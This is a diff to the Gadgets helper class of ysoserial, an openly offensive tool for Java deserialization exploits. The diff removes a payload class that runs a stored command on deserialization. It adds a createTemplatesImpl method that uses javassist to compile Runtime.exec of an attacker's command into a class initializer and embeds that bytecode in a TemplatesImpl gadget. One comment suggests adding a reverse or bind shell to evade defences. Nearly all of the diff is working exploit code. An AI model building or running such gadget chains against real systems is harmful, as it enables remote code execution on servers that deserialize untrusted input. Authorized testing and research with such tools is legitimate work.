@@ -1,7 +1,5 @@
 package ysoserial.payloads.util;
 
-import java.io.IOException;
-import java.io.ObjectInputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.InvocationHandler;
@@ -9,9 +7,15 @@ import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
@@ -20,37 +24,15 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
  */
 @SuppressWarnings("restriction")
 public class Gadgets {
-	private static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+	private static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";	
+	
+	public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+		private static final long serialVersionUID = -5971610431559700674L;
 
-	// serializable translet subclass that will command stored in field when deserialized 
-	public static class TransletPayload extends AbstractTranslet implements Serializable {		
-		private static final long serialVersionUID = 5571793986024357801L;
-		
-		{
-			namesArray = new String[0]; // needed to make TemplatesImpl happy
-		}
-		
-		private String command;
-		
-		// execute stored command on deserialization
-		private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
-			in.defaultReadObject(); // read command string
-			try {
-				Runtime.getRuntime().exec(command); // execute command
-			} catch (IOException e) {
-				e.printStackTrace(); // not trying to be stealthy
-			}			 
-		}
-		
-		public TransletPayload withCommand(String command) {
-			this.command = command;
-			return this;
-		}		
-		
 		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
-		
-		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) 
-			throws TransletException {}
+
+		@Override
+		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}	
 	}
 
 	// required to make TemplatesImpl happy
@@ -80,5 +62,31 @@ public class Gadgets {
 		final Map<String,Object> map = new HashMap<String, Object>();
 		map.put(key,val);
 		return map;
+	}
+
+	public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
+		final TemplatesImpl templates = new TemplatesImpl();		
+		
+		// use template gadget class
+		ClassPool pool = ClassPool.getDefault();
+		pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+		final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+		// run command in static initializer
+		// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+		clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
+		// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+		clazz.setName("ysoserial.Pwner" + System.nanoTime());		
+		
+		final byte[] classBytes = clazz.toBytecode();
+		
+		// inject class bytes into instance
+		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+			classBytes,
+			ClassFiles.classAsBytes(Foo.class)});
+		
+		// required to make TemplatesImpl happy
+		Reflections.setFieldValue(templates, "_name", "Pwnr"); 			
+		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+		return templates;
 	}
 }
